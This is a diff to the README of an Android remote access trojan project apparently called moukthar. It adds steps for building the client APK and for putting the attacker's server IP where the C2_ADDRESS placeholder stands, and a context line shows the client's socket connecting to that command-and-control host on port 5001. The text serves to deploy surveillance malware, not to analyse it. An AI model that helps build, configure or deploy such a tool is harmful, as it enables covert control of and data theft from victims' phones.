@@ -42,6 +42,12 @@ Specify the ip/domain of the C2 server in the [Client app](client/app/src/main/j
 Socket ioSocket = IO.socket(URI.create("http://C2_ADDRESS:5001"));
 ```
 
+## Build APK
+- Open up the client folder as a project in android studio 
+- Replace C2_ADDRESS with the ip address of your server here: https://github.com/Tomiwa-Ot/moukthar/blob/9d7f431bf8eb8af1490b7412818b123354504951/client/app/src/main/java/com/ot/androidrat/MainService.java#L32
+- For building the apk:
+https://developer.android.com/studio/run
+
 ## Production Environment Setup
 For linux envitonments, run ```server/setup.sh``` with a privileged user to make moukthar a service.
 ```console
